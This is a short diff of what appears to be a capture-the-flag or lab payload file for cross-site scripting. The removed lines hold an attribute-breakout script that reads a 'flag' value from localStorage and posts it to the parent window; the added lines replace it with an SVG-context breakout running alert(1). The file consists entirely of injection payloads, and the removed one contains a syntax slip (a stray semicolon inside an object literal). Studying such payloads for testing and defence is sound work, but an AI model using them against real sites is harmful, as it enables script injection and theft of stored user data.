@@ -1,6 +1,2 @@
-"><script>
-window.parent.postMessage({
-        type: "list",
-        list: localStorage.getItem('flag');
-    }, location.origin);
-</script>
+DC"></svg><script>alert(1);</script><svg>
+D+
